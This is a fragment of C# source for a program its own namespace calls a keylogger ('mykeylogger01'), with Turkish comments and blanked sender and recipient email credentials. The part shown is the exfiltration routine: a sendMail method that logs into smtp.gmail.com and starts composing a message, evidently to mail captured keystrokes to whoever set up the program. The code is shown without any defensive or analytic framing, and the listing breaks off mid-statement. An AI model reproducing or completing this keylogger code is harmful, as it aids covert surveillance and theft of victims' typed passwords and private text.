...
namespace mykeylogger01
{
    class Program
    {
        private const string FROM_EMAIL_ADDRESS = "***"; //Gönderici email adresi
        private const string FROM_EMAIL_PASSWORD = "***"; //Gönderici email şifresi
        private const string TO_EMAIL_ADDRESS = "***"; //Alıcı email adresi
        ...
        public static string FROM_EMAIL_ADDRESS1 => FROM_EMAIL_ADDRESS2;

        public static string FROM_EMAIL_ADDRESS2 => FROM_EMAIL_ADDRESS;
        ...
        public static void sendMail()
        {
            try
            {
                ...
                SmtpClient client = new SmtpClient("smtp.gmail.com")
                {
                    ...
                    Credentials = new NetworkCredential(FROM_EMAIL_ADDRESS1, FROM_EMAIL_PASSWORD),
                    EnableSsl = true,
                };

                MailMessage message = new MailMessage
                {
                    From = new MailAddress(FROM_EMAIL_ADDRESS1),
